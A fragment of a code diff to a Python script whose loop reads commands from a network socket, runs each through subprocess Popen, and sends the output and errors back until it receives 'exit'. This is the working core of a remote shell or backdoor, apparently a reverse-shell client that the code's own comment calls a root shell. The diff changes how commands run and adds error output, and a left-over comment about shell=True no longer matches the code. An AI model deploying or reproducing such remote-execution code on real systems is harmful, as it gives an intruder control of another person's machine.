@@ -14,9 +14,11 @@ command = clientSocket.recv(4064).decode()
 while command != "exit":
 	#We need to add shell=True here in order for the command to be executed through the root shell.
 	# It's a big security hole, but...
-	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE, shell=True)
+	proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE)
 	result, err = proc.communicate()
-	clientSocket.send(result)
+	if(err != ""):
+		print(err)
+	clientSocket.send(result + err)
 	command = (clientSocket.recv(4064)).decode()
 
 clientSocket.close()
